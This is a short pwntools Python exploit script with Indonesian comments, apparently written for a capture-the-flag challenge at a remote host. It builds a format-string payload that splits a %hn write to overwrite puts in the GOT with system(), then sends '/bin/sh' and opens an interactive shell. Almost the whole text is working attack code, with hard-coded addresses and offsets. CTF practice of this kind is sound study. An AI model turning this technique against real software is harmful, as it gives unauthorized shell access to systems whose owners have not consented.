from pwn import *

# === 1. KONFIGURASI TARGET ===
# io = process('./vuln')              # Aktifkan untuk LOCAL
io = remote('target-ctf.id', 1234)    # Aktifkan untuk REMOTE (NC)

context.arch = 'i386' # Arsitektur 32-bit sesuai gambar

# === 2. ALAMAT MEMORI (DARI ANALISIS GAMBAR) ===
got_puts = 0x0804a010     # Alamat GOT[puts] yang mau ditimpa
system_addr = 0xb7e52070  # Alamat system() di libc
bin_sh_addr = 0xb7f6d4af  # Alamat string "/bin/sh" di libc
offset = 4                # Offset buf di stack

# Pecah alamat system menjadi 2 bagian untuk %hn (2 byte)
# 0xb7e52070 -> low: 0x2070 (8304), high: 0xb7e5 (47077)
low = system_addr & 0xffff
high = (system_addr >> 16) & 0xffff

# === 3. MENYUSUN PAYLOAD (TAHAP 1: OVERWRITE GOT) ===
# Kita pakai split write agar stabil

# Header alamat (8 byte)
payload = p32(got_puts)      # Ditunjuk oleh param ke-4
payload += p32(got_puts + 2) # Ditunjuk oleh param ke-5

# Hitung jumlah karakter (padding)
fmt_low = low - 8
fmt_high = high - low

payload += f"%{fmt_low}c%4$hn".encode()
payload += f"%{fmt_high}c%5$hn".encode()

# Kirim payload tahap 1
io.sendline(payload)

# === 4. TAHAP 2: TRIGGER SYSTEM("/bin/sh") ===
# Di skenario ini, kita berasumsi program akan memanggil puts(input_kita) lagi
# atau kita mengirimkan string yang akan dibaca oleh puts yang sudah jadi system
io.sendline(b"/bin/sh")

io.interactive()